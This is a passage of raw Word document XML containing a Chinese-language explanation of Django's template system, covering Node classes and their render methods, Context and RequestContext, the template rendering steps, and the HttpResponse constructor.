          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Nodes </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>可以做各种处理，但有一个共同点：</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每一个</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必须有一个叫做</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> render </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的方法，它接受的第二个参数（第一个参</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数，显然是</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实例）是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的一个实例，这是一个类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似于字典的对象，包含所有模板可以获得的变量。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Node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render </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>方法必须返回</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一个字符串，但如果</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的工作不是输出（比如，它是要通过增加，删除或修</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改传入的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实例变量中的变量来修改模板上下文），可以返回空字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA69635"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包含许多</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的子类来提供有用的功能。比如，每个内置的模板标签都</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被一个</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的子类处理（比如，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">IfNode </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> if </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>标签，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">ForNode </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>实现了</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>标签，等等）。所有内置标签可以在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.defaulttags </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>找到。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DDD5202" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00AC3224" w:rsidRDefault="00870C85" w:rsidP="00BC6A81">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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="041DCCF8" wp14:editId="064CF0A8">
            <wp:extent cx="3539066" cy="2717165"/>
            <wp:effectExtent l="0" t="0" r="4445" b="6985"/>
            <wp:docPr id="1" name="图片 1" descr="sdf">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f">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2460" cy="2727448"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA0000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实际上，上面介绍的所有模板结构都是某种形式的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nodes</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，纯文本也不异常。变</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量查找由</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> VariableNode </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>处理，出于自然，过滤也应用在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> VariableNode </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>上，标</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签是各种类型的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nodes</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，纯文本是一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> TextNode</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2CE1C8"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一般来说，一个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渲染一个模板要经过下面的步骤，依次是：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DE9112"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w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>加载需要渲染的模板。这是由</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.loader.get_template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>完</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成的，它能利用这许多方法中的任意一个来定位需要的模板文件。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> get_template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>函数返回一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例，其中包含</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经过解析的模板和用到的方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C702A1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w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例化一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>用来渲染模板。如果用的是</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的子类</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.template.RequestContext</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，那么附带的上下文处理函数就会自动添</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加在</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中没有定义的变量。</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的构建器方法用一个键</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值对的字</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典（对于模板，它将变为名</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值变量）作为它唯一的参数，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">RequestContext </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>则用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> HttpRequest </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的一个实例和一个字典。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560BAA4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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>调用</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> render </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Context </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象作为第一个位置参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1890D55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Template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render </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法的返回值是一个字符串，它由</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中所有</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Nodes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render </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>方法返回的值连接而成，调用顺序为它们出现在</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Template </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中</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的顺序。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07553922"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68" w:name="sec15"/>
      <w:bookmarkEnd w:id="68"/>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>关于</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Response</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="444444"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>，一点点</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7D8E9D"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一旦一个模板完成渲染，或者产生了其它某些合适的输出，</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">view </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>就会负责产生一</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个</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> django.http.HttpResponse </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>实例，它的构建器接受两个可选的参数：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD4FEE4"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w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>一个作为</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> response </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>主体的字符串（它应该是第一位置参数，或者是关键字</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参数</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> content</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）。大部分时间，这将作为渲染一个模板的输出，但不是必须</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这样，在这里你可以传入任何有效的</w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Python </w:t>
      </w:r>
      <w:r w:rsidRPr="00E50F7D">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6843535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w:t>
